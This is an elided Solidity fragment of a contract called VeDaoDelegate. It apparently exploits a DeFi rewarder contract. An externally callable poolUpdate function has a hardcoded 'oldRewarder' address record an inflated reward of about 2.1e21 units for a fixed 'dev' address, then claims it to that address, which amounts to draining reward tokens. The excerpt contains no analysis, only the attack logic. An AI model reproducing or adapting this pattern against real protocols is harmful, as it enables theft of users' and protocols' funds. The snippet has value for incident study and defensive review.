...
contract VeDaoDelegate {
    ...
    IRewarder oldRewarder = IRewarder(0xD146953707dC086ee35Ce42839c4d029C3f8CAdF);
    address dev = 0x0aAFbba47f44e59B2d81c1f5158d33389Ee8dD4C;
    function lockableToken(uint256 poolId) external view  returns (IERC20) {
    ...
    function poolUpdate(address, uint256 pid, uint256 amount) external  {
        oldRewarder.onReward(pid, dev, 29028825, 2111243251423142118684);
        oldRewarder.claim(pid, dev, 29028825, dev);
    }
}